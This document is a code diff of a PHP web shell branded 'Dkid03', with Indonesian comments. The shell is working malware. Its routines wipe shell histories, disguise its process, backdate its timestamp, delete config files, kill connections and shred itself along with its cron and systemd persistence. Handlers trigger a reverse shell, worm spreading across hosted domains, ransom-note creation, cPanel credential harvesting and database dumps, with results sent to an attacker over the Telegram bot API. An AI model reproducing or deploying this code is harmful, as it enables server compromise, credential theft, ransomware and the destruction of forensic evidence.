+                if (file_exists($path)) { @file_put_contents($path, ''); $cleared_hist++; }
             }
         }
         $results[] = "✅ Histories Cleared: $cleared_hist files";
     }
     
-    // ===== 5. HIDE PROCESS =====
+    // 5. HIDE PROCESS
     $pid = getmypid();
     $fake = ['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'][array_rand(['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'])];
-    if (function_exists('cli_set_process_title')) {
-        cli_set_process_title($fake);
-    }
+    if (function_exists('cli_set_process_title')) cli_set_process_title($fake);
     @shell_exec("echo '$fake' > /proc/$pid/comm 2>/dev/null");
     @shell_exec("prctl PR_SET_NAME '$fake' 2>/dev/null");
     $results[] = "✅ Process Hidden as: $fake (PID: $pid)";
     
-    // ===== 6. CHANGE FILE TIMESTAMP =====
+    // 6. CHANGE TIMESTAMP
     $old_time = strtotime('2020-01-01 00:00:00') + rand(0, 31536000);
     @touch(__FILE__, $old_time, $old_time);
     $results[] = "✅ File Timestamp Changed to: " . date('Y-m-d H:i:s', $old_time);
     
-    // ===== 7. FAKE LOGIN =====
+    // 7. FAKE LOGIN
     $fake_ip = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'][array_rand(['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'])];
     $fake_user = ['root', 'admin', 'user', 'test'][array_rand(['root', 'admin', 'user', 'test'])];
     $fake_time = date('Y-m-d H:i:s', time() - rand(3600, 86400));
@@ -2181,27 +1737,19 @@ function one_click_all() {
         }
     }
     
-    // ===== 8. DELETE TEMP FILES =====
+    // 8. DELETE TEMP
     $deleted_temp = 0;
     foreach (['/tmp/', '/var/tmp/', '/dev/shm/'] as $dir) {
         if (is_dir($dir)) {
             $files = @glob($dir . '*.tmp');
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (@unlink($file)) $deleted_temp++;
-                }
-            }
+            if ($files !== false) { foreach ($files as $file) { if (@unlink($file)) $deleted_temp++; } }
             $files = @glob($dir . '*.tmp.*');
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (@unlink($file)) $deleted_temp++;
-                }
-            }
+            if ($files !== false) { foreach ($files as $file) { if (@unlink($file)) $deleted_temp++; } }
         }
     }
     $results[] = "✅ Temp Files Deleted: $deleted_temp files";
     
-    // ===== 9. REMOVE SENSITIVE FILES =====
+    // 9. REMOVE SENSITIVE
     $sensitive_patterns = [
         '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
         '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
@@ -2225,31 +1773,29 @@ function one_click_all() {
     }
     $results[] = "✅ Sensitive Files Removed: $deleted_sensitive files";
     
-    // ===== 10. KILL ACTIVE CONNECTIONS =====
+    // 10. KILL CONNECTIONS
     if (function_exists('shell_exec') && isRoot()) {
         @shell_exec('pkill -9 -f "http|ssh|ftp|mysql" 2>/dev/null');
         $results[] = "✅ Active connections killed";
     }
     
-    // ===== 11. CLEAR PHP TEMP FILES =====
+    // 11. CLEAR PHP TEMP
     $php_tmp = @glob('/tmp/*.php');
     if ($php_tmp !== false) {
         foreach ($php_tmp as $file) {
-            if (strpos($file, basename(__FILE__)) === false) {
-                @unlink($file);
-            }
+            if (strpos($file, basename(__FILE__)) === false) { @unlink($file); }
         }
         $results[] = "✅ Temp PHP files cleaned";
     }
     
-    // ===== 12. CLEAR SYSTEM CACHE =====
+    // 12. CLEAR SYSTEM CACHE
     if (function_exists('shell_exec')) {
         @shell_exec('sync 2>/dev/null');
         @shell_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
         $results[] = "✅ System cache dropped";
     }
     
-    // ===== KIRIM REPORT =====
+    // KIRIM REPORT
     $execution_time = round(microtime(true) - $start_time, 2);
     $results[] = "⏱️ Execution time: $execution_time seconds";
     
@@ -2257,10 +1803,99 @@ function one_click_all() {
          . "Total actions: " . count($results) . "\n"
          . "Execution time: $execution_time seconds\n\n"
          . "📋 Details:\n" . implode("\n", $results);
-    
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     
-    self_destruct_ultimate();
+    // ===== SELF-DESTRUCTION =====
+    $current_file = __FILE__;
+    
+    // 1. Hapus semua backup
+    $backup_patterns = [
+        dirname(__DIR__) . '/.cache/*.inc',
+        '/tmp/*' . md5($current_file) . '*.inc',
+        '/var/tmp/*' . md5($current_file) . '*.inc',
+        '/dev/shm/*' . md5($current_file) . '*.inc',
+        $current_file . '/.cache/*.inc',
+        '/tmp/temp.inc',
+        '/var/tmp/temp.inc',
+        '/dev/shm/temp.inc'
+    ];
+    foreach ($backup_patterns as $pattern) {
+        $files = @glob($pattern);
+        if ($files !== false) {
+            foreach ($files as $file) {
+                if (function_exists('shell_exec')) {
+                    @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
+                    @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
+                    @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
+                }
+                @unlink($file);
+            }
+        }
+    }
+    
+    // 2. Hapus cron
+    if (function_exists('shell_exec')) {
+        @shell_exec('crontab -r 2>/dev/null');
+        @shell_exec('crontab -l 2>/dev/null | grep -v "' . basename($current_file) . '" | crontab - 2>/dev/null');
+        @shell_exec('crontab -l 2>/dev/null | grep -v "cache_repair" | crontab - 2>/dev/null');
+        @shell_exec('crontab -l 2>/dev/null | grep -v "system_cache" | crontab - 2>/dev/null');
+    }
+    
+    // 3. Hapus systemd service
+    if (function_exists('shell_exec')) {
+        @shell_exec('systemctl stop dkd_cache.service 2>/dev/null');
+        @shell_exec('systemctl disable dkd_cache.service 2>/dev/null');
+        @shell_exec('systemctl stop dkd.service 2>/dev/null');
+        @shell_exec('systemctl disable dkd.service 2>/dev/null');
+        @shell_exec('rm -f /etc/systemd/system/dkd*.service 2>/dev/null');
+        @shell_exec('systemctl daemon-reload 2>/dev/null');
+    }
+    
+    // 4. Hapus rc.local
+    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
+        $rc = file_get_contents('/etc/rc.local');
+        $rc = preg_replace('/.*' . preg_quote(basename($current_file), '/') . '.*\n/', '', $rc);
+        $rc = preg_replace('/.*cache_repair.*\n/', '', $rc);
+        $rc = preg_replace('/.*dkd.*\n/', '', $rc);
+        file_put_contents('/etc/rc.local', $rc);
+    }
+    
+    // 5. Hapus file utama
+    if (function_exists('shell_exec')) {
+        @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("chmod 777 " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("rm -f " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("shred -fuz " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("dd if=/dev/urandom of=" . escapeshellarg($current_file) . " bs=1M count=1 2>/dev/null");
+        @shell_exec("rm -f " . escapeshellarg($current_file) . " 2>/dev/null");
+    }
+    @chmod($current_file, 0777);
+    @unlink($current_file);
+    
+    // 6. Self-delete script fallback
+    $script = '/tmp/self_del_' . rand(1000, 99999) . '.sh';
+    $content = '#!/bin/bash
+sleep 2
+chattr -i ' . escapeshellarg($current_file) . ' 2>/dev/null
+chattr -a ' . escapeshellarg($current_file) . ' 2>/dev/null
+rm -f ' . escapeshellarg($current_file) . ' 2>/dev/null
+shred -fuz ' . escapeshellarg($current_file) . ' 2>/dev/null
+rm -f ' . escapeshellarg($script) . ' 2>/dev/null
+';
+    @file_put_contents($script, $content);
+    @chmod($script, 0755);
+    @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
+    
+    session_destroy();
+    if (ini_get("session.use_cookies")) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000,
+            $params["path"], $params["domain"],
+            $params["secure"], $params["httponly"]
+        );
+    }
+    exit;
 }
 
 // ==================== HANDLER GET ====================
@@ -2276,27 +1911,39 @@ if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION
     exit;
 }
 
-if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    dump_databases();
-    echo "💾 Database dump executed. Check Telegram.";
+if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    clean_traces();
+    echo "🧹 Traces cleaned. Check Telegram.";
     exit;
 }
 
-if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    find_sensitive_files();
-    echo "🔍 Config finder executed. Check Telegram.";
+if (isset($_GET['check_file']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $fileInfo = get_file_location();
+    $message = "📋 *FILE INFORMATION*\n\n"
+             . "📁 Nama: <code>" . basename(__FILE__) . "</code>\n"
+             . "📂 Path: <code>" . __FILE__ . "</code>\n"
+             . "🌐 Domain: <code>" . $fileInfo['domain'] . "</code>\n"
+             . "🔗 URL: <a href='" . $fileInfo['url'] . "'>" . $fileInfo['url'] . "</a>\n"
+             . "📅 Last Modified: " . date('Y-m-d H:i:s', filemtime(__FILE__)) . "\n"
+             . "📏 Size: " . formatSize(filesize(__FILE__));
+    sendTelegramMessage($botToken, $telegramUserId, $message);
+    echo "✅ File information sent to Telegram!";
+    exit;
+}
+
+if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $action = $_GET['action'] ?? 'list';
+    $username = $_GET['user'] ?? '';
+    $extra = $_GET['extra'] ?? '';
+    $result = cpanel_handler($action, $username, $extra);
+    sendTelegramMessage($botToken, $telegramUserId, "📋 *cPanel Result*\n\n" . $result);
+    echo $result;
     exit;
 }
 
 if (isset($_GET['harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     cpanel_harvest();
     echo "🔑 Harvest executed. Check Telegram.";
-    exit;
-}
-
-if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    clean_traces();
-    echo "🧹 Traces cleaned. Check Telegram.";
     exit;
 }
 
@@ -2314,11 +1961,6 @@ if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['l
     if ($action == 'start') { start_reverse_shell($ip, $port); echo "✅ Reverse shell started."; }
     elseif ($action == 'stop') echo stop_reverse_shell($port);
     elseif ($action == 'status') echo status_reverse_shell();
-    exit;
-}
-
-if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    echo clean_logs_advanced();
     exit;
 }
 
@@ -2340,12 +1982,15 @@ if (isset($_GET['create_ransom']) && isset($_SESSION['loggedin']) && $_SESSION['
     exit;
 }
 
-if (isset($_GET['selfdestruct']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-        self_destruct_ultimate();
-    } else {
-        echo "⚠️ Confirm with: ?selfdestruct=1&confirm=yes";
-    }
+if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    find_sensitive_files();
+    echo "🔍 Config finder executed. Check Telegram.";
+    exit;
+}
+
+if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    dump_databases();
+    echo "💾 Database dump executed. Check Telegram.";
     exit;
 }
 
@@ -2407,19 +2052,23 @@ if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['lo
     exit;
 }
 
+if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    echo clean_logs_advanced();
+    exit;
+}
+
 if (isset($_GET['cache_repair']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     system_cache_repair();
     echo "✅ System cache repaired.";
     exit;
 }
 
-if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['action'] ?? 'list';
-    $username = $_GET['user'] ?? '';
-    $extra = $_GET['extra'] ?? '';
-    $result = cpanel_handler($action, $username, $extra);
-    sendTelegramMessage($botToken, $telegramUserId, "📋 *cPanel Result*\n\n" . $result);
-    echo $result;
+if (isset($_GET['selfdestruct']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
+        self_destruct_ultimate();
+    } else {
+        echo "⚠️ Confirm with: ?selfdestruct=1&confirm=yes";
+    }
     exit;
 }
 
@@ -2431,129 +2080,6 @@ if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['logg
         echo "⚠️ ONE CLICK requires confirmation: ?one_click=1&confirm=yes";
     }
     exit;
-}
-
-// ==================== TELEGRAM COMMAND HANDLER ====================
-function telegram_command_handler($botToken, $chatId) {
-    if (!isset($_SESSION['telegram_offset'])) $_SESSION['telegram_offset'] = 0;
-    
-    $url = "https://api.telegram.org/bot{$botToken}/getUpdates";
-    $data = [
-        'offset' => $_SESSION['telegram_offset'], 
-        'timeout' => 10,
-        'allowed_updates' => ['message']
-    ];
-    $postData = http_build_query($data);
-    $result = false;
-    
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        $result = curl_exec($ch);
-        curl_close($ch);
-    }
-    
-    if ($result === false) {
-        if (ini_get('allow_url_fopen')) {
-            $options = [
-                'http' => [
-                    'method' => 'POST',
-                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
-                    'content' => $postData,
-                    'timeout' => 10
-                ],
-                'ssl' => [
-                    'verify_peer' => false,
-                    'verify_peer_name' => false
-                ]
-            ];
-            $context = stream_context_create($options);
-            $result = @file_get_contents($url, false, $context);
-        }
-    }
-    
-    if ($result === false) return;
-    
-    $updates = json_decode($result, true);
-    if (!isset($updates['ok']) || !$updates['ok'] || empty($updates['result'])) return;
-    
-    foreach ($updates['result'] as $update) {
-        $_SESSION['telegram_offset'] = $update['update_id'] + 1;
-        
-        if (!isset($update['message']['text'])) continue;
-        if ($update['message']['chat']['id'] != $chatId) continue;
-        
-        $cmd = $update['message']['text'];
-        $parts = explode(' ', $cmd);
-        $command = strtolower($parts[0]);
-        $param = $parts[1] ?? '';
-        $param2 = $parts[2] ?? '';
-        $param3 = $parts[3] ?? '';
-        $response = '';
-        
-        switch ($command) {
-            case '/start':
-            case '/help':
-                $response = "💀 *Dkid03 Bot*\n\n"
-                          . "📂 /ls [dir]\n"
-                          . "📥 /download [file]\n"
-                          . "⚡ /exec [cmd]\n"
-                          . "🪱 /worm\n"
-                          . "🪱 /worminfectall\n"
-                          . "🧹 /clean\n"
-                          . "💾 /dumpdb\n"
-                          . "🔑 /harvest\n"
-                          . "🔍 /configfinder\n"
-                          . "👤 /backdooruser [user] [pass]\n"
-                          . "🔌 /reverseshell start/stop/status\n"
-                          . "🔑 /sshkeys\n"
-                          . "📊 /wpscan\n"
-                          . "💀 /selfdestruct\n"
-                          . "🧹 /antiforensic\n"
-                          . "🛡️ /bypasssuhosin\n"
-                          . "📂 /createftp [user] [pass]\n"
-                          . "📧 /createmail [email] [pass]\n"
-                          . "💀 /makeransom\n"
-                          . "💀 /deeppersist install/remove\n"
-                          . "🔑 /pambypass install/remove\n"
-                          . "💀 /userpersist install/remove\n"
-                          . "📋 /listspread\n"
-                          . "🔄 /cache\n"
-                          . "💀 /oneclick";
-                break;
-                
-            case '/worm':
-                $result = worm_spread_to_domains(__FILE__);
-                $response = "🪱 *Worm Spread*\n\n✅ Berhasil: " . count($result) . " direktori terinfeksi.";
-                break;
-                
-            case '/worminfectall':
-                $result = worm_infect_all_domains(__FILE__);
-                $response = "🪱 *Worm Infect All Domains*\n\n"
-                          . "✅ Berhasil: " . count($result['infected']) . " direktori\n"
-                          . "❌ Gagal: " . count($result['errors']) . "\n"
-                          . "🔗 Links: " . count($result['links']) . " domain";
-                break;
-                
-            case '/oneclick':
-                one_click_all();
-                $response = "💀 ONE CLICK executed! File will be deleted.";
-                break;
-                
-            default:
-                $response = "❌ Perintah tidak dikenal. Ketik /help";
-        }
-        
-        if (!empty($response)) {
-            sendTelegramMessage($botToken, $chatId, $response);
-        }
-    }
 }
 
 // ==================== LOGIN OTP ====================
@@ -2593,8 +2119,6 @@ if (isset($_SESSION['loggedin'])) {
         exit;
     }
     
-    telegram_command_handler($botToken, $telegramUserId);
-    
     $currentPath = $rootPath;
     if (isset($_GET['path'])) {
         $requestedPath = realpath($_GET['path']);
@@ -2610,233 +2134,151 @@ if (isset($_SESSION['loggedin'])) {
     }
     
     // ===== HANDLER POST =====
-    
-    // CREATE FILE / FOLDER
     if (isset($_POST['create']) && isset($_POST['type']) && isset($_POST['name'])) {
         try {
             $type = $_POST['type'];
             $name = trim($_POST['name']);
-            
             if (empty($name)) throw new Exception('Nama tidak boleh kosong');
             if (preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) throw new Exception('Nama mengandung karakter tidak valid');
-            
             $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
             if (file_exists($newPath)) throw new Exception('File/folder sudah ada: ' . $name);
-            
             if ($type === 'file') {
-                if (@touch($newPath)) {
-                    @chmod($newPath, 0644);
-                    $success = '✅ File berhasil dibuat: ' . $name;
-                } else {
-                    throw new Exception('Gagal membuat file: ' . $name);
-                }
+                if (@touch($newPath)) { @chmod($newPath, 0644); $success = '✅ File berhasil dibuat: ' . $name; }
+                else { throw new Exception('Gagal membuat file: ' . $name); }
             } elseif ($type === 'folder') {
-                if (@mkdir($newPath, 0755, true)) {
-                    $success = '✅ Folder berhasil dibuat: ' . $name;
-                } else {
-                    throw new Exception('Gagal membuat folder: ' . $name);
-                }
-            } else {
-                throw new Exception('Tipe tidak valid');
-            }
-            
+                if (@mkdir($newPath, 0755, true)) { $success = '✅ Folder berhasil dibuat: ' . $name; }
+                else { throw new Exception('Gagal membuat folder: ' . $name); }
+            } else { throw new Exception('Tipe tidak valid'); }
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // UPLOAD FILE
     if (isset($_FILES['upload']) && !empty($_FILES['upload']['name'][0])) {
         try {
             if (!is_writable($currentPath)) throw new Exception('Direktori tidak dapat ditulisi');
-            
             $mode = $_POST['upload_mode'] ?? 'normal';
             $targetDirs = [$currentPath];
             if ($mode === 'bulk_shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
             elseif ($mode === 'bulk_deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
             $targetDirs = array_filter($targetDirs, 'is_writable');
-            
             $uploadedFiles = [];
             $errors = [];
             $fileCount = count($_FILES['upload']['name']);
-            
             for ($i = 0; $i < $fileCount; $i++) {
-                if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) {
-                    $errors[] = "Error upload file " . ($i+1);
-                    continue;
-                }
-                
+                if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) { $errors[] = "Error upload file " . ($i+1); continue; }
                 $safeName = basename($_FILES['upload']['name'][$i]);
                 $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
-                
-                if (file_exists($mainTarget)) {
-                    $errors[] = "File sudah ada: $safeName";
-                    continue;
-                }
-                
+                if (file_exists($mainTarget)) { $errors[] = "File sudah ada: $safeName"; continue; }
                 if (@move_uploaded_file($_FILES['upload']['tmp_name'][$i], $mainTarget)) {
                     @chmod($mainTarget, 0644);
                     $uploadedFiles[] = $safeName;
-                    
                     foreach ($targetDirs as $dir) {
                         if ($dir !== $currentPath) {
                             @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
                             @chmod($dir . DIRECTORY_SEPARATOR . $safeName, 0644);
                         }
                     }
-                } else {
-                    $errors[] = "Gagal upload: $safeName";
-                }
+                } else { $errors[] = "Gagal upload: $safeName"; }
             }
-            
             if (!empty($uploadedFiles)) {
                 $success = '✅ File berhasil diupload: ' . implode(', ', $uploadedFiles);
                 if (!empty($errors)) $success .= "\n⚠️ Error: " . implode(', ', $errors);
-            } else {
-                throw new Exception('Tidak ada file yang berhasil diupload');
-            }
-            
+            } else { throw new Exception('Tidak ada file yang berhasil diupload'); }
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // BULK DELETE
     if (isset($_POST['delete_bulk']) && isset($_POST['file_list'])) {
         try {
             $fileList = $_POST['file_list'] ?? '';
             $deleteMode = $_POST['delete_mode'] ?? 'current';
-            
             if (empty(trim($fileList))) throw new Exception('Daftar file tidak boleh kosong');
-            
             $files = preg_split('/[\n,]+/', trim($fileList));
             $files = array_filter(array_map('trim', $files));
             if (empty($files)) throw new Exception('Tidak ada file yang valid');
-            
             $targetDirs = [$currentPath];
             if ($deleteMode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
             elseif ($deleteMode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
             $targetDirs = array_filter($targetDirs, 'is_dir');
-            
             $deleted = [];
             $notFound = [];
             $errors = [];
-            
             foreach ($targetDirs as $dir) {
                 foreach ($files as $file) {
                     $path = $dir . DIRECTORY_SEPARATOR . $file;
                     if (strpos($path, '..') !== false) continue;
-                    
                     if (is_file($path)) {
-                        if (@unlink($path)) {
-                            $deleted[] = $path;
-                        } else {
-                            @chmod($path, 0777);
-                            if (@unlink($path)) $deleted[] = $path;
-                            else $errors[] = $path;
-                        }
+                        if (@unlink($path)) { $deleted[] = $path; }
+                        else { @chmod($path, 0777); if (@unlink($path)) { $deleted[] = $path; } else { $errors[] = $path; } }
                     } elseif (is_dir($path) && $file !== '.' && $file !== '..') {
-                        if (deleteDirectory($path)) $deleted[] = $path . '/';
-                        else $errors[] = $path . '/';
-                    } elseif (!in_array($file, $notFound)) {
-                        $notFound[] = $file;
-                    }
+                        if (deleteDirectory($path)) { $deleted[] = $path . '/'; }
+                        else { $errors[] = $path . '/'; }
+                    } elseif (!in_array($file, $notFound)) { $notFound[] = $file; }
                 }
             }
-            
             $msgParts = [];
             if (!empty($deleted)) $msgParts[] = 'Terhapus: ' . count($deleted) . ' file/dir';
             if (!empty($notFound)) $msgParts[] = 'Tidak ditemukan: ' . implode(', ', array_unique($notFound));
             if (!empty($errors)) $msgParts[] = 'Gagal dihapus: ' . count($errors) . ' file';
             if (empty($msgParts)) throw new Exception('Tidak ada yang dihapus');
-            
             $success = '✅ Hasil hapus massal: ' . implode('; ', $msgParts);
-            
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // RENAME
     if (isset($_POST['rename']) && isset($_POST['target']) && isset($_POST['new_name'])) {
         try {
             $target = $_POST['target'] ?? '';
             $newName = $_POST['new_name'] ?? '';
-            
             if (empty($target) || empty($newName)) throw new Exception('Target dan nama baru harus diisi');
             if (preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) throw new Exception('Nama mengandung karakter tidak valid');
-            
             $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
             $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
-            
             if (!file_exists($targetPath)) throw new Exception('File/folder tidak ditemukan');
             if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
             if (file_exists($newPath)) throw new Exception('File/folder dengan nama tersebut sudah ada');
             if (!@rename($targetPath, $newPath)) throw new Exception('Gagal mengganti nama');
-            
             $success = '✅ Berhasil rename: ' . $target . ' → ' . $newName;
-            
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // SAVE FILE
     if (isset($_POST['save_file']) && isset($_POST['file']) && isset($_POST['content'])) {
         try {
             $file = $_POST['file'];
             $content = $_POST['content'];
             $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
-            
             if (!file_exists($filePath) || !is_file($filePath)) throw new Exception('File tidak ditemukan');
             if (!isSafePath($filePath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
             if (!is_writable($filePath)) throw new Exception('File tidak dapat ditulisi');
             if (@file_put_contents($filePath, $content) === false) throw new Exception('Gagal menyimpan file');
-            
             $success = '✅ File berhasil disimpan: ' . $file;
-            
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // ACTION (DELETE, CHMOD, DOWNLOAD)
     if (isset($_GET['action'])) {
         try {
             $action = $_GET['action'];
             $target = $_GET['target'] ?? '';
             $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
-            
             if (empty($target) || !file_exists($targetPath)) throw new Exception('Target tidak ditemukan');
             if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
-            
             switch ($action) {
                 case 'delete':
-                    if (deleteDirectory($targetPath)) $success = '✅ Berhasil menghapus: ' . $target;
-                    else throw new Exception('Gagal menghapus: ' . $target);
+                    if (deleteDirectory($targetPath)) { $success = '✅ Berhasil menghapus: ' . $target; }
+                    else { throw new Exception('Gagal menghapus: ' . $target); }
                     break;
-                    
                 case 'chmod':
                     if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) throw new Exception('Mode permission tidak valid');
-                    if (@chmod($targetPath, octdec($_POST['mode']))) $success = '✅ Berhasil mengubah permission: ' . $target . ' → ' . $_POST['mode'];
-                    else throw new Exception('Gagal mengubah permission');
+                    if (@chmod($targetPath, octdec($_POST['mode']))) { $success = '✅ Berhasil mengubah permission: ' . $target . ' → ' . $_POST['mode']; }
+                    else { throw new Exception('Gagal mengubah permission'); }
                     break;
-                    
                 case 'download':
                     if (is_dir($targetPath)) throw new Exception('Tidak dapat mendownload direktori');
                     header('Content-Description: File Transfer');
@@ -2845,32 +2287,14 @@ if (isset($_SESSION['loggedin'])) {
                     header('Content-Length: ' . filesize($targetPath));
                     readfile($targetPath);
                     exit;
-                    
-                case 'unzip':
-                    if (!class_exists('ZipArchive')) throw new Exception('Ekstensi Zip tidak tersedia');
-                    $zip = new ZipArchive();
-                    if ($zip->open($targetPath) === TRUE) {
-                        $zip->extractTo($currentPath);
-                        $zip->close();
-                        $success = '✅ Berhasil mengekstrak: ' . $target;
-                    } else {
-                        throw new Exception('Gagal membuka file zip');
-                    }
-                    break;
-                    
                 default:
                     throw new Exception('Aksi tidak dikenali: ' . $action);
             }
-            
             header('Location: ?path=' . urlencode($currentPath));
             exit;
-            
-        } catch (Exception $e) {
-            $error = $e->getMessage();
-        }
+        } catch (Exception $e) { $error = $e->getMessage(); }
     }
     
-    // TERMINAL
     $terminalActive = isTerminalActive();
     $terminalOutput = '';
     if (isset($_POST['run_command']) && $terminalActive) {
@@ -2967,7 +2391,7 @@ if (isset($_SESSION['loggedin'])) {
     <?php if (!isset($_SESSION['loggedin'])): ?>
         <div class="login-container">
             <div class="login-box">
-                <h1 class="login-title">Dkid03</h1>
+                <h1 class="login-title">💀 Dkid03</h1>
                 <?php if (!empty($loginError)): ?>
                     <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
                 <?php endif; ?>
@@ -3005,6 +2429,7 @@ if (isset($_SESSION['loggedin'])) {
                     <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
                 </div>
                 <div class="sidebar-menu">
+                    <!-- FILE MANAGER -->
                     <div class="menu-section">
                         <div class="menu-title">📁 File</div>
                         <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
@@ -3013,33 +2438,33 @@ if (isset($_SESSION['loggedin'])) {
                         <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder"></i> Folder</div>
                         <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
                     </div>
+                    
+                    <!-- WORM -->
                     <div class="menu-section">
                         <div class="menu-title">🪱 WORM</div>
                         <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Worm Spread</div>
                         <div class="menu-item" onclick="runWormInfectAll()" style="color:#ff4444;"><i class="fas fa-bug"></i> Infect All Domains</div>
                     </div>
+                    
+                    <!-- ONE CLICK -->
                     <div class="menu-section">
                         <div class="menu-title">💀 ONE CLICK</div>
                         <div class="menu-item" onclick="runOneClick()" style="color:#ff0000;font-weight:bold;">
                             <i class="fas fa-skull-crossbones"></i> ONE CLICK ALL
                         </div>
                     </div>
+                    
+                    <!-- ADVANCED -->
                     <div class="menu-section">
-                        <div class="menu-title">⚡ System</div>
-                        <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
-                        <div class="menu-item" onclick="runDump()"><i class="fas fa-database"></i> Dump DB</div>
-                        <div class="menu-item" onclick="runHarvest()"><i class="fas fa-key"></i> Harvest</div>
